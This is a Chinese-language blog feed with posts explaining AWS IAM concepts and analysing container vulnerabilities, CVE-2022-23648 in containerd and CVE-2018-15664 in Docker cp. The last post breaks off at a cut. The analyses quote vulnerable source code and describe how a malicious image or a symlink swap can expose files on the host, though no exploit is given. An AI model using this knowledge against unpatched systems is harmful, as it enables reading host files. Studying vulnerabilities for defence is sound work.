src="/img/bVc9bUO" alt="截屏2023-08-09 21.23.48.png"><br>成功通关<br><img src="/img/bVc9bUP" alt="截屏2023-08-09 21.24.40.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/640694595">蚁景安全</a></li><li><a href="https://wiki.teamssix.com/cloudservice/iam/the_big_iam_challenge_writeup.html">teamsSix Wiki</a></li><li><a href="https://docs.aws.amazon.com/">aws文档</a></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>IAM学习</title>
    <link href="/cll58powq0005kcut5mwa57c3/"/>
    <url>/cll58powq0005kcut5mwa57c3/</url>
    
    <content type="html"><![CDATA[<p>AWS Identity and Access Management (IAM) 是一种 Web 服务，可以帮助您安全地控制对 AWS 资源的访问。借助 IAM，可以集中管理控制用户可访问哪些 AWS 资源的权限。可以使用 IAM 来控制谁通过了身份验证（准许登录）并获得授权（拥有权限）来使用资源。</p><h2 id="IAM相关概念"><a href="#IAM相关概念" class="headerlink" title="IAM相关概念"></a>IAM相关概念</h2><p>Resources: IAM中的对象，如user,group,Role,Policy等<br>Identities: 被赋予policy的对象<br>Entities: 用来鉴权的对象<br>Principals:认证主体，可请求对 AWS 资源执行操作的人类用户或工作负载。在身份验证后，可以向主体授予永久或临时凭证，以允许其向 AWS 发出请求，具体取决于主体类型</p><h2 id="IAM工作流程简析"><a href="#IAM工作流程简析" class="headerlink" title="IAM工作流程简析"></a>IAM工作流程简析</h2><p>下图是aws官网提供的IAM工作原理图<br><img src="/img/bVc89Oz" alt="截屏2023-08-07 20.17.52.png"><br>当我们想要对某个资源进行某些操作时首先会经过Authentication阶段，该阶段主要是为了验证身份的合法性，即验证“你是谁”。当鉴权通过后，此次操作的请求会进入Authorization阶段，该阶段主要是为了验证操作的合法性，即验证“你有没有权限做这个操作”，该阶段会通过policy进行验证，在验证时依照以下几个原则进行检查：<br>    - 默认情况下，所有request都被拒绝<br>    - 被显式授权的操作才可以执行<br>    - 多个policy存在时只要有一个policy拒绝了某个操作，那么该操作就会被拒绝（拒绝优先级大于允许）<br>当Authorization阶段判定当前操作可以执行后会根据请求中的信息对相应的资源进行操作。</p><h2 id="IAM-policy"><a href="#IAM-policy" class="headerlink" title="IAM policy"></a>IAM policy</h2><p>上面提到，在Authorization阶段会使用policy进行验证，那么什么是policy呢？在AWS中，权限会通过policy的形式被赋予给用户&#x2F;组&#x2F;角色等，通常是以json形式存在的。通常情况下，AWS中有以下几种policy：</p><ol><li>identity-based policy： 赋予给用户&#x2F;组&#x2F;角色的policy，用来制定用户&#x2F;组&#x2F;角色可以进行哪些操作。</li><li>resource-based policy: 赋予给S3等资源的policy，用来制定某些用户可以对该资源进行什么样的操作</li><li>permissions boundaries： 针对identity-based policy，用来能够赋予给用户&#x2F;组&#x2F;角色的最大权限集合（对resource-based policy无效）</li><li>Organizations SCPs： 在组织中，对组织内部所有的账号设置可用的最大权限的集合</li><li>Access Control Lists：控制其他账号中的用户访问本账号资源的policy</li><li>session policy：当使用AWS CLI 或者AWS API时限制了用户&#x2F;角色传递给session的权限的最大集合</li></ol><p>该条policy为identity-based policy，表示可以对所有的S3资源进行只读操作，将这条规则赋予给用户&#x2F;组&#x2F;角色后，他们就可以对所有的S3资源进行只读操作</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-string">&quot;s3:Get*&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;s3:List*&quot;</span><br>      <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>该条policy为resource-based policy，表示所有认证主体都可以对corp-fs-web-bucket下的所有资源进行读取操作</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:GetObject&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::corp-fs-web-bucket/*&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>下面简单介绍一下IAM JSON策略语言的语法：<br>总体来说一个policy要包括以下三个部分：version_block,id_block,statement_block。</p><ol><li>version_block可选项，用于定义策略语言的版本，常用的有”2008-10-17”和“2012-10-17”</li><li>id_block可选项，用来表示policy的id，可以在resoucre-based policy中使用，不能在identity-based policy中使用</li><li>statement_block表示当前的policy中不同的权限语句，一个statement_block包括以下几部分：</li></ol><ul><li>sid_block： 可选项，用于区分不同的权限语句</li><li>principal_block： 可选项，用于指定权限语句赋予的认证主体，identity-based policy无需制定，因为该类规则被赋予给用户&#x2F;组&#x2F;角色时就隐式地制定了principal。resource-based policy需要指定</li><li>effect_block：表示允许还是拒绝该条操作，可选值包括ALLOW和DENY</li><li>action_block：表示该条权限语句影响的操作列表</li><li>resource_block：表示该条语句影响的资源列表</li><li>condition_block： 可选项，用于更加精细地控制用户究竟能访问资源下的哪些数据</li></ul><p>其中，resource_block部分需要使用ARN进行指定</p><h2 id="ARN"><a href="#ARN" class="headerlink" title="ARN"></a>ARN</h2><p>ARN（Amazon Resource Name）的格式如下：<br><code>arn:partition:service:region:account:resource</code><br>其中各个部分代表的含义为：</p><ul><li>partition 用于标识资源所在的分区。对于标准 AWS 区域，分区是 aws。如果资源位于其他分区，则分区是 aws-partitionname。例如，中国（北京）区域中的资源的分区为 aws-cn。您不能在不同分区的账户之间委派访问权限。</li><li>service 标识 AWS 产品。IAM 资源始终使用 iam。</li><li>region 标识资源的区域。对于 IAM 资源，它始终保持空白。</li><li>account 指定没有连字符的 AWS 账户 ID。</li><li>resource 按名称标识特定资源。</li></ul><p>示例：<br>    arn:aws:iam::account:root<br>    arn:aws:iam::account:user&#x2F;user-name-with-path<br>    arn:aws:iam::account:group&#x2F;group-name-with-path<br>    arn:aws:iam::account:role&#x2F;role-name-with-path<br>    arn:aws:iam::account:policy&#x2F;policy-name-with-path<br>    arn:aws:iam::account:instance-profile&#x2F;instance-profile-name-with-pat<br>由于IAM是全球资源，所以IAM的ARM的region部分为空<br>大多数情况下我们都会使用ARN指定一个资源，但是除了ARN意外，还可以使用资源的唯一ID进行指定。并且我们可以通过资源的唯一ID的前缀判断当前资源时哪一类资源：</p><table><thead><tr><th>前缀</th><th>资源类型</th></tr></thead><tbody><tr><td>ABIA</td><td>AWS STS 服务持有者令牌</td></tr><tr><td>ACCA</td><td>上下文特定凭证</td></tr><tr><td>AGPA</td><td>用户组</td></tr><tr><td>AIDA</td><td>IAM 用户</td></tr><tr><td>AIPA</td><td>Amazon EC2 实例配置文件</td></tr><tr><td>AKIA</td><td>访问密钥</td></tr><tr><td>ANPA</td><td>托管策略</td></tr><tr><td>ANVA</td><td>托管策略中的版本</td></tr><tr><td>APKA</td><td>公有密钥</td></tr><tr><td>AROA</td><td>角色</td></tr><tr><td>ASCA</td><td>证书</td></tr><tr><td>ASIA</td><td>临时 (AWS STS) 访问密钥 ID 使用此前缀，但仅在与秘密访问密钥和会话令牌结合使用时才具有唯一性。</td></tr></tbody></table><p> |</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-23648漏洞分析</title>
    <link href="/cll58pown0002kcut7ekx1je2/"/>
    <url>/cll58pown0002kcut7ekx1je2/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-23648漏洞分析"><a href="#CVE-2022-23648漏洞分析" class="headerlink" title="CVE-2022-23648漏洞分析"></a>CVE-2022-23648漏洞分析</h1><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>此次漏洞出现在containerd组件中，当我们创建了一个恶意的镜像容器时，攻击者可以通过此漏洞读取主机上的任意文件和目录。实际上这也是一个由于没有正确处理文件链接所导致的一个漏洞。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据github上containerd官方的修复<a href="https://github.com/containerd/containerd/commit/075cfdff68941fe30338ebe034fa67ce09fb4b55">commit</a>显示，漏洞点在&#x2F;pkg&#x2F;cri&#x2F;opts&#x2F;container.go的WithVolumes函数中。那么接下来就分析一下这个函数是如何被调用的以及是如何出现漏洞的。</p><h2 id="漏洞函数分析"><a href="#漏洞函数分析" class="headerlink" title="漏洞函数分析"></a>漏洞函数分析</h2><p>存在漏洞的函数如下：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithVolumes</span><span class="hljs-params">(volumeMounts <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>)</span></span> containerd.NewContainerOpts &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, client *containerd.Client, c *containers.Container)</span></span> (err <span class="hljs-type">error</span>) &#123;<br>...<br>root, err := os.MkdirTemp(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;ctd-volume&quot;</span>)<br>...<br>        <span class="hljs-keyword">var</span> mountPaths []<span class="hljs-type">string</span><br><span class="hljs-keyword">if</span> goruntime.GOOS == <span class="hljs-string">&quot;windows&quot;</span> &#123;<br><span class="hljs-keyword">for</span> _, m := <span class="hljs-keyword">range</span> mounts &#123;<br><span class="hljs-comment">// appending the layerID to the root.</span><br>mountPath := filepath.Join(root, filepath.Base(m.Source))<br>mountPaths = <span class="hljs-built_in">append</span>(mountPaths, mountPath)<br><span class="hljs-keyword">if</span> err := m.Mount(mountPath); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">defer</span> unmounter(m.Source)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mountPaths = <span class="hljs-built_in">append</span>(mountPaths, root)<br><span class="hljs-keyword">if</span> err := mount.All(mounts, root); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;failed to mount: %w&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> unmounter(root)<br>&#125;<br><span class="hljs-keyword">for</span> host, volume := <span class="hljs-keyword">range</span> volumeMounts &#123;<br>...<br><span class="hljs-keyword">for</span> _, mountPath := <span class="hljs-keyword">range</span> mountPaths &#123;<br>src := filepath.Join(mountPath, volume)<br><span class="hljs-keyword">if</span> _, err := os.Stat(src); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> os.IsNotExist(err) &#123;<br><span class="hljs-comment">// Skip copying directory if it does not exist.</span><br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;stat volume in rootfs: %w&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> err := copyExistingContents(src, host); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;taking runtime copy of volume: %w&quot;</span>, err)<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在该函数中，进行了一次卷内文件和容器内文件的同步，但是其中的src可控并且没有对src是否为链接文件进行处理，导致攻击者可以通过将src链接到某个文件实现将宿主机上任意文件的只读副本复制进容器内部。</p><h2 id="漏洞函数调用链"><a href="#漏洞函数调用链" class="headerlink" title="漏洞函数调用链"></a>漏洞函数调用链</h2><p>在containerd项目的cmd&#x2F;containerd&#x2F;main.go的main函数中调用了command.App函数。在该函数中新开启了一个go协程调用server.New函数创建并初始化了一个containerd server</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">App</span><span class="hljs-params">()</span></span> *cli.App &#123;<br>...<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(chsrv)<br><br>server, err := server.New(ctx, config)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> chsrv &lt;- srvResp&#123;err: err&#125;:<br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// Launch as a Windows Service if necessary</span><br><span class="hljs-keyword">if</span> err := launchService(server, done); err != <span class="hljs-literal">nil</span> &#123;<br>logrus.Fatal(err)<br>&#125;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br>server.Stop()<br><span class="hljs-keyword">case</span> chsrv &lt;- srvResp&#123;s: server&#125;:<br>&#125;<br>&#125;()<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>在server.New函数中嗲用service.Register函数注册了一系列的grpc服务</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">for</span> _, service := <span class="hljs-keyword">range</span> grpcServices &#123;<br><span class="hljs-keyword">if</span> err := service.Register(grpcServer); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>service.Register函数是一个接口函数，实际执行注册逻辑的是下面的函数</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *criService)</span></span> register(s *grpc.Server) <span class="hljs-type">error</span> &#123;<br>instrumented := newInstrumentedService(c)<br>runtime.RegisterRuntimeServiceServer(s, instrumented)<br>runtime.RegisterImageServiceServer(s, instrumented)<br>instrumentedAlpha := newInstrumentedAlphaService(c)<br>runtime_alpha.RegisterRuntimeServiceServer(s, instrumentedAlpha)<br>runtime_alpha.RegisterImageServiceServer(s, instrumentedAlpha)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到在上面的函数中为两类runtime（runtime和runtime_alpha）分别注册了ImageService和RuntimeService。runtime和runtime_alpha注册服务的逻辑大同小异，以runtime为例，我们主要关注其RuntimeService。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">RegisterRuntimeServiceServer</span><span class="hljs-params">(s *grpc.Server, srv RuntimeServiceServer)</span></span> &#123;<br>s.RegisterService(&amp;_RuntimeService_serviceDesc, srv)<br>&#125;<br></code></pre></td></tr></table></figure><p>其中_RuntimeService_serviceDesc的内容如下：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">var</span> _RuntimeService_serviceDesc = grpc.ServiceDesc&#123;<br>ServiceName: <span class="hljs-string">&quot;runtime.v1.RuntimeService&quot;</span>,<br>HandlerType: (*RuntimeServiceServer)(<span class="hljs-literal">nil</span>),<br>Methods: []grpc.MethodDesc&#123;<br>&#123;<br>MethodName: <span class="hljs-string">&quot;Version&quot;</span>,<br>Handler:    _RuntimeService_Version_Handler,<br>&#125;,<br>&#123;<br>MethodName: <span class="hljs-string">&quot;RunPodSandbox&quot;</span>,<br>Handler:    _RuntimeService_RunPodSandbox_Handler,<br>&#125;,<br>&#123;<br>MethodName: <span class="hljs-string">&quot;StopPodSandbox&quot;</span>,<br>Handler:    _RuntimeService_StopPodSandbox_Handler,<br>&#125;,<br>&#123;<br>MethodName: <span class="hljs-string">&quot;RemovePodSandbox&quot;</span>,<br>Handler:    _RuntimeService_RemovePodSandbox_Handler,<br>&#125;,<br>&#123;<br>MethodName: <span class="hljs-string">&quot;PodSandboxStatus&quot;</span>,<br>Handler:    _RuntimeService_PodSandboxStatus_Handler,<br>&#125;,<br>&#123;<br>MethodName: <span class="hljs-string">&quot;ListPodSandbox&quot;</span>,<br>Handler:    _RuntimeService_ListPodSandbox_Handler,<br>&#125;,<br>&#123;<br>MethodName: <span class="hljs-string">&quot;CreateContainer&quot;</span>,<br>Handler:    _RuntimeService_CreateContainer_Handler,<br>&#125;,<br>...<br><br><br>&#125;,<br>Streams:  []grpc.StreamDesc&#123;&#125;,<br>Metadata: <span class="hljs-string">&quot;api.proto&quot;</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p>在_RuntimeService_serviceDesc中包含了一系列的接口以及对应的处理函数，我们主要关注CreateContainer的处理函数<code>_RuntimeService_CreateContainer_Handler</code></p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> _<span class="hljs-title">RuntimeService_CreateContainer_Handler</span><span class="hljs-params">(srv <span class="hljs-keyword">interface</span>&#123;&#125;, ctx context.Context, dec <span class="hljs-keyword">func</span>(<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> <span class="hljs-type">error</span>, interceptor grpc.UnaryServerInterceptor) (<span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-type">error</span>) &#123;<br>in := <span class="hljs-built_in">new</span>(CreateContainerRequest)<br><span class="hljs-keyword">if</span> err := dec(in); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> interceptor == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> srv.(RuntimeServiceServer).CreateContainer(ctx, in)<br>&#125;<br>info := &amp;grpc.UnaryServerInfo&#123;<br>Server:     srv,<br>FullMethod: <span class="hljs-string">&quot;/runtime.v1.RuntimeService/CreateContainer&quot;</span>,<br>&#125;<br>handler := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, req <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (<span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> srv.(RuntimeServiceServer).CreateContainer(ctx, req.(*CreateContainerRequest))<br>&#125;<br><span class="hljs-keyword">return</span> interceptor(ctx, in, info, handler)<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数首先定义了一个grpc类，其对外提供的接口为”&#x2F;runtime.v1.RuntimeService&#x2F;CreateContainer”，处理函数为CreateContaienr函数，在CreateContainer函数中有这样的代码片段：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(volumeMounts) &gt; <span class="hljs-number">0</span> &#123;<br>mountMap := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>)<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> volumeMounts &#123;<br>mountMap[filepath.Clean(v.HostPath)] = v.ContainerPath<br>&#125;<br>opts = <span class="hljs-built_in">append</span>(opts, customopts.WithVolumes(mountMap))<br>&#125;<br></code></pre></td></tr></table></figure><p>该代码片段表示如果容器的Volume不为空的话，那么就将WithVolumes函数添加到opts中，而opts中的函数都会在下面的代码段中被传到NewContainer函数中并在该函数中被调用执行</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">if</span> cntr, err = c.client.NewContainer(ctx, id, opts...); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create containerd container: %w&quot;</span>, err)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Client)</span></span> NewContainer(ctx context.Context, id <span class="hljs-type">string</span>, opts ...NewContainerOpts) (Container, <span class="hljs-type">error</span>) &#123;<br>...<br><span class="hljs-keyword">for</span> _, o := <span class="hljs-keyword">range</span> opts &#123;<br><span class="hljs-keyword">if</span> err := o(ctx, c, &amp;container); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>也就是说，如果容器的volume不为空的话就会执行到WithVolumes函数。在上面的分析中我们得知WithVolumes就是存在漏洞的函数。至此该漏洞的调用链我们简单分析完毕，当containerd的”&#x2F;runtime.v1.RuntimeService&#x2F;CreateContainer”或“&#x2F;runtime.v1alpha2.RuntimeService&#x2F;CreateContainer”（runtime_alpha的RuntimeService中定义的接口）接口被调用时就会触发漏洞。</p><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>由于docker的创建容器的函数逻辑没有使用到containerd的接口，而是使用docker daemon中的处理逻辑，所以docker+containerd的架构下并不存在该漏洞</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2018-15664符号链接替换漏洞分析</title>
    <link href="/cll58pows0007kcut1fvm3hq0/"/>
    <url>/cll58pows0007kcut1fvm3hq0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2018-15664符号链接替换漏洞分析"><a href="#CVE-2018-15664符号链接替换漏洞分析" class="headerlink" title="CVE-2018-15664符号链接替换漏洞分析"></a>CVE-2018-15664符号链接替换漏洞分析</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Aleksa Sarai在2019年公布了一个docker的符号链接替换漏洞（cve-2018-15664）。该漏洞的成因是docker cp过程中会遭受到TOCTOU攻击。简单来讲就是docker在cp过程中的路径在被进行安全转换后并没有被立即使用，攻击者可以先使用一个合法文件进行安全转换，在转换后的路径被使用之前将其替换为一个带有恶意软链接的文件进行攻击。</p><h2 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h2><p>（git commit id : 20262688df290f1196c5620112488f6445b7eb26）<br>docker cp分为两类：从容器中向宿主机复制文件和从宿主机向容器中复制文件。本文以从容器中向宿主机复制文件为例简单从代码层面分析漏洞的成因。<br>当用户执行docker cp命令从容器中向宿主机复制文件时，docker client 会接受到用户输入的命令并进入下面的处理逻辑（&#x2F;cli&#x2F;command&#x2F;container&#x2F;cp.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs golang"><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">copyFromContainer</span><span class="hljs-params">(ctx context.Context, dockerCli *command.DockerCli, srcContainer, srcPath, dstPath <span class="hljs-type">string</span>, cpParam *cpConfig)</span></span> (err <span class="hljs-type">error</span>) &#123;<br>...<br><span class="hljs-keyword">if</span> cpParam.followLink &#123;<br>srcStat, err := statContainerPath(ctx, dockerCli, srcContainer, srcPath)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &amp;&amp; 